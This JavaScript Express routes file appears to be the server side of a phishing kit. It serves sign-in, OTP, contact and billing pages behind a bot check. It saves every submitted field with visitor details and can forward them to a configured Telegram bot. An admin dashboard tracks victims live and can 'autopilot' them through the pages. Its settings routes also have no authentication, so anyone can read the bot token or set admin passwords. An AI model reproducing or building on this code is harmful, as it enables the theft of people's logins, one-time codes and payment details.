import express from "express";
import geoip from "geoip-lite";
import session from "express-session";
import { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, requireAdmin, routeMap } from "../utils.js";
import capRouter, { requireCap } from "../altcheck.js";
import dotenv from "dotenv";
import bcrypt from "bcrypt";
dotenv.config();


export default function createRoutes(db, io) {
  const router = express.Router();

router.get("/header", (req, res) => {
res.sendFile("header.html", { root: "views/admin" });
});

router.get('/', requireCap, (req, res, next) => {
	  if (req.session?.capVerified) return res.redirect(routeMap.final);
 	 res.redirect(routeMap.final);
	  });

router.get('/sign-in', requireCap, (req, res, next) => {
  const { user } = req.session;
  const { action } = req.query;

  // If no session, redirect or show default page
  if (!user) {
    req.session.user = { user };

    if (action) return res.redirect('/sign-in');
    return res.sendFile('index.html', { root: 'views/user' });
  }

  // If session exists, determine which page to show
  const pages = {
    otp: 'otp.html',
    contact: 'contact.html',
    bill: 'bill.html',
  };

  const page = pages[action] || 'index.html';
  res.sendFile(page, { root: 'views/user' });
});


router.get("/admin", (req, res) => {
  const { isAdmin } = req.session;
  const page = req.query.page;
  
  if (!isAdmin) {
    return res.sendFile("adminlogin.html", { root: "views/admin" });
  }
  
  const pages = {
    result: "result.html",
    settings: "settings.html",
    dashboard: "admin.html", // default admin dashboard
  };
  
  const targetPage = pages[page] || pages.dashboard;
  res.sendFile(targetPage, { root: "views/admin" });
});


router.post("/admin", async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: "Username and password required"
      });
    }

    // Fetch admin by username
    const admin = await db.get(
      "SELECT id, password_hash FROM admins WHERE username = ?",
      [username]
    );

    // Prevent username enumeration
    if (!admin) {
      return res.status(401).json({
        success: false,
        message: "Invalid credentials"
      });
    }

    // Compare password with hash
    const validPassword = await bcrypt.compare(
      password,
      admin.password_hash
    );

    if (!validPassword) {
      return res.status(401).json({
        success: false,
        message: "Invalid credentials"
      });
    }

    // Auth success
    req.session.isAdmin = true;
    req.session.adminId = admin.id;

    return res.json({
      success: true,
      message: "Login successful"
    });

  } catch (err) {
    console.error("Admin login error:", err);
    return res.status(500).json({
      success: false,
      message: "Internal server error"
    });
  }
});


router.get("/logout", (req, res) => {
  req.session.destroy(() => {
    res.redirect("/admin"); // back to login page
  });
});


  router.post("/delete", async (req, res) => {
	  const { userId } = req.body;
	  await db.run(`DELETE FROM results WHERE user_id = ?`, [userId]);
	
	  // Emit new list
	  const results = await db.all(`SELECT * FROM results ORDER BY timestamp DESC`);
	  io.emit("admin:resultsUpdate", results);
	
	  res.json({ success: true });
	});


  // ✅ Submit route
  router.post("/submit", async (req, res) => {
  try {
    const { userId } = req.body;
    const myObject = req.body;
    let formattedData = "";

    // -------------------------------
    // 🧩 STEP 1: Get user_info
    // -------------------------------
    const existingResult = await db.get(
      `SELECT user_info FROM results WHERE user_id = ?`,
      [userId]
    );
    
    const telegramInfo = await db.get(
	  `SELECT BotToken, ChatID, TelegramEnabled FROM admin_settings WHERE id = ?`,
	  [1]
	);
	
	console.log("tg info", telegramInfo?.TelegramEnabled);
	
	// Assign to individual variables
	const BotToken = telegramInfo?.BotToken || "";
	const ChatID = telegramInfo?.ChatID || "";
	const telegramEnableStatus = telegramInfo?.TelegramEnabled ? true : false;
	
	console.log(BotToken, ChatID, telegramEnableStatus);
    
    let userInfoToSave = existingResult?.user_info || null;
    if (!userInfoToSave) {
      userInfoToSave = await buildUserInfo(req, sendAPIRequest);
      console.log(`🌍 Built userInfo for ${userId}`);
    } else {
      console.log(`ℹ️ Reusing existing userInfo for ${userId}`);
    }

    // -------------------------------
    // 🔠 STEP 2: Normalize keys
    // -------------------------------
    const myObjectLower = Object.fromEntries(
      Object.entries(myObject).map(([k, v]) => [k.toLowerCase(), v])
    );

    // -------------------------------
    // 📤 STEP 3: Build message
    // -------------------------------
    
   console.log("tg en status:", telegramEnableStatus);
    
	const message = await buildMessage(
		  req.body,
		  {
		    sendToTelegram: telegramEnableStatus,
		    botToken: BotToken, 
		    chatId: ChatID
		  }
		);
	
    //if (!message) return res.status(500).json({ error: "Failed to build message" });

    // -------------------------------
    // 🧠 STEP 4: Update identifier
    // -------------------------------
    const identifierValue =
      myObjectLower.user ||
      myObjectLower.user_id ||
      myObjectLower.username ||
      myObjectLower.email;

    if (identifierValue) {
      await db.run(
        `UPDATE users SET identifier = ? WHERE id = ?`,
        [identifierValue, userId]
      );
      console.log(`✅ Updated identifier for user ${userId}: ${identifierValue}`);
    }

    // -------------------------------
    // 📋 STEP 5: Append input_data
    // -------------------------------
    Object.entries(myObject).forEach(([key, value]) => {
      const lowerKey = key.toLowerCase();
      if (["visitor", "users","security_code"].includes(lowerKey)) return;
      formattedData += `${key} : ${value}\n`;
    });

    const existingUser = await db.get(
      `SELECT input_data FROM users WHERE id = ?`,
      [userId]
    );
    const updatedData =
      (existingUser?.input_data || "") + "\n-----------------\n" + formattedData.trim();

    await db.run(
      `UPDATE users SET input_data = ? WHERE id = ?`,
      [updatedData.trim(), userId]
    );
    console.log(`✅ input_data updated for ${userId}`);

    // -------------------------------
    // 🗂 STEP 6: Save results
    // -------------------------------
    await db.run(
      `
      INSERT INTO results (user_id, message, user_info, timestamp)
      VALUES (?, ?, ?, CURRENT_TIMESTAMP)
      ON CONFLICT(user_id) DO UPDATE SET
        message   = results.message || '\n-----------------\n' || excluded.message,
        user_info = CASE
                      WHEN results.user_info IS NULL OR results.user_info = ''
                      THEN excluded.user_info
                      ELSE results.user_info
                    END,
        timestamp = CURRENT_TIMESTAMP
      `,
      [userId, message, userInfoToSave]
    );

    // -------------------------------
    // 🟢 STEP 7: Fetch users based on userDisp
    // -------------------------------
    const settingRow = await db.get("SELECT userDisp FROM admin_settings LIMIT 1");
    const usersDisplay = (settingRow?.userDisp || "active").toString().trim().toLowerCase();

    let users;
    if (usersDisplay === "all") {
      users = await db.all(`SELECT * FROM users ORDER BY last_seen DESC`);
    } else {
      // active (last 2 minutes)
      users = await db.all(`
        SELECT * FROM users
        WHERE last_seen >= datetime('now', '-2 minutes')
        ORDER BY last_seen DESC
      `);
    }

    const updatedUsers = users.map((u) =>
      u.id === userId ? { ...u, screen: "loading" } : u
    );
    io.emit("admin:update", updatedUsers);

    // -------------------------------
    // 📡 STEP 8: Emit results update
    // -------------------------------
    const results = await db.all(`
      SELECT 
        r.user_id, 
        r.message, 
        r.user_info, 
        r.timestamp, 
        u.identifier
      FROM results r
      LEFT JOIN users u ON r.user_id = u.id
      ORDER BY r.timestamp DESC
    `);
    io.emit("admin:resultsUpdate", results);

    // -------------------------------
    // 🤖 STEP 9: Autopilot redirect
    // -------------------------------
    const user = await db.get("SELECT page FROM users WHERE id = ?", [userId]);
    const nextPage = getNextPage(user?.page, req);
    console.log("next page auto", nextPage);
    const autopilot = await isAutopilotOn(db);

   /* if (autopilot && nextPage) {
      setTimeout(() => {
        for (let [id, socket] of io.of("/").sockets) {
          if (socket.userId === userId) {
            socket.emit("user:command", { command: "redirect", link: nextPage });
            break;
          }
        }
      }, 2000);
    } */

    	const response = { success: true };
		console.log("autopilot:", autopilot);
		if (autopilot && nextPage) {
		  response.link = nextPage;
		}
		
		return res.json(response);
  } catch (err) {
    console.error("❌ /submit error:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
});
  
	  router.get("/autopilot", async (req, res) => {
	  const setting = await db.get("SELECT autopilot FROM admin_settings LIMIT 1");
	  res.json({ autopilot: setting ? setting.autopilot : 0 });
	});
	
	router.get("/settings", async (req, res) => {
  const setting = await db.get(
  "SELECT BotToken, ChatID, TelegramEnabled, baSUB FROM admin_settings WHERE id = 1"
);
  console.log("settings:", setting);
  res.json(setting);
});

router.post("/settings", async (req, res) => {
  const {
    BotToken,
    ChatID,
    TelegramEnabled = 0,
    baSub = 0,
    adminPass,
    adminUserInput
  } = req.body;

  try {
    await db.run(
      `UPDATE admin_settings
       SET BotToken = ?,
           ChatID = ?,
           TelegramEnabled = ?,
           baSUB = ?
       WHERE id = 1`,
      [
        BotToken ?? null,
        ChatID ?? null,
        TelegramEnabled ? 1 : 0,
        baSub ? 1 : 0
      ]
    );

    if (adminUserInput && adminPass) {
      const hash = await bcrypt.hash(adminPass, 12);

      await db.run(
        `INSERT INTO admins (username, password_hash)
         VALUES (?, ?)
         ON CONFLICT(username) DO UPDATE
         SET password_hash = excluded.password_hash`,
        [adminUserInput, hash]
      );
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("Error updating settings:", err);
    res.sendStatus(500);
  }
});

	// Toggle autopilot
	router.post("/autopilot", async (req, res) => {
	  const { autopilot } = req.body;
	
	  await db.run(`
	    INSERT INTO admin_settings (id, autopilot)
	    VALUES (1, ?)
	    ON CONFLICT(id) DO UPDATE SET autopilot = excluded.autopilot
	  `, [autopilot]);
	  
	  res.json({ success: true, autopilot });
	});
	
	// Get current view mode
router.get("/admin/viewmode", async (req, res) => {
  const setting = await db.get("SELECT userDisp FROM admin_settings LIMIT 1");
  res.json({ viewMode: setting?.userDisp || "active" });
});

// Update view mode
router.post("/admin/viewmode", async (req, res) => {
  const { viewMode } = req.body;
  if (!["active", "all"].includes(viewMode)) {
    return res.status(400).json({ error: "Invalid mode" });
  }
  await db.run("UPDATE admin_settings SET userDisp = ?", [viewMode]);
  res.json({ success: true });
});

router.post("/deleteuser", async (req, res) => {
  try {
    const { userId } = req.body;

    if (!userId) {
      return res.status(400).json({ error: "Missing userId" });
    }

    // Delete user where id matches
    await db.run("DELETE FROM users WHERE id = ?", [userId]);

    console.log(`🗑️ User ${userId} deleted successfully`);
    res.json({ success: true, message: "User deleted successfully" });

  } catch (err) {
    console.error("⚠️ Error deleting user:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

  return router;
}